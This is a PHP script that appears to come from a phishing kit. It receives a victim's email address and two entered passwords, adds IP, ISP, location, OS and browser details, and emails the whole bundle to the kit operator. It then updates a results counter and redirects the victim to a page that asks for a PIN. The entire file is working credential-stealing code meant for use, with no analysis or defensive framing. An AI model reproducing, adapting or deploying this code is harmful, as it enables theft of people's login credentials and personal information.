<?php
session_start();

error_reporting(0);
session_start();
require_once '../../../main.php';



$_SESSION['email'];
$mail = $_SESSION['email'];
$pw= $_POST['submit'];
$pw2= $_POST['password2'];
$message   = "

#--------------------[ G-SPOT. Inc ]---------------------#
#--------------------[ EMAIL LOGIN ]---------------------#

Email     :   ".$mail."
Password  :   ".$pw."
Password 2:   ".$pw2."


#------------------------[ DEVICE INFORMATION ]-----------------------#

IP Address  : ".$ip."
ISP		    : ".$ispuser."
Region		: ".$regionuser."
City		: ".$cityuser."
GMT         : ".$continent."
Timezone	: ".$timezone."
OS/Browser	: ".$os." / ".$br."
Date		: ".$date."
User Agent	: ".$user_agent."

#--------------------[ きみ の こと が すき だから ]---------------------#




";

$from = $senderemail;
$headers = "From: $sendername <$from>";
$subject = "Email Access ".$mail." - [ ".$ip." - ".$cn." - ".$os." ]";
mail($email, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r")); 

$file = "../../../result/total_email.txt";
$isi  = @file_get_contents($file);
$buka = fopen($file,"w"); 
fwrite($buka, $isi+1);
fclose($buka);

$ip = getenv("REMOTE_ADDR");

echo "<script type='text/javascript'>window.top.location='/confirm/pin/?account=$key';</script>";
?>
